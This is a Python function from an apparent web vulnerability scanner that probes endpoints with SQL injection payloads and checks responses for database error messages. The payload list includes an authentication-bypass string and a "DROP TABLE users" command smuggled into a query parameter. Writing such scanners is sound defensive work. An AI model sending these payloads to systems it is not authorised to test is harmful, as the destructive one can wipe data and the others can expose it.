from backend.utils.http_client import make_request
from backend.utils.response_parser import format_log
from .utils import create_result

def sql_injection_test(base_url, options):
    """
    Attempt basic SQL injection attacks on given endpoints.
    
    Args:
        base_url (str): Target URL.
        options (dict): Should include "endpoints" and "param_name".
    
    Returns:
        dict: Standardized result dictionary.
    """
    result_logs = []
    # A minimal set of payloads for demonstration.
    # Real tests should use more extensive payload lists.
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "\" OR \"1\"=\"1",
    ]

    # Endpoints that accept GET (or possibly POST) parameters
    endpoints = options.get("endpoints", ["/search"])
    # Parameter name(s) to inject
    param_name = options.get("param_name", "q")

    for endpoint in endpoints:
        for payload in payloads:
            # Build the full URL with the payload as a GET parameter
            url_with_payload = f"{base_url}{endpoint}?{param_name}={payload}"
            try:
                response = make_request(url_with_payload)
                # Log the attempt
                log_msg = format_log(
                    message=f"SQL Injection attempt on {endpoint}",
                    details={"payload": payload, "status_code": response.status_code}
                )
                result_logs.append(log_msg)
                # (Optional) Check for known DB error messages
                error_markers = ["mysql_fetch", "syntax error", "MySQL", "SQL syntax"]
                if any(marker.lower() in response.text.lower() for marker in error_markers):
                    result_logs.append(format_log(
                        message="Possible SQL injection vulnerability detected",
                        details={"endpoint": endpoint, "payload": payload}
                    ))
            except Exception as e:
                result_logs.append(format_log(
                    message=f"Error during SQL injection request to {endpoint}",
                    details={"error": str(e), "payload": payload}
                ))
    
    # Ensure any log entry (even if a dict) is converted to lower-case text for the check.
    vulnerability_detected = any(
        "vulnerability detected" in (
            log["message"].lower() if isinstance(log, dict) and "message" in log 
            else str(log).lower()
        )
        for log in result_logs
    )
    
    return create_result(
        logs=result_logs,
        score=8,
        success=True if vulnerability_detected else False
    )
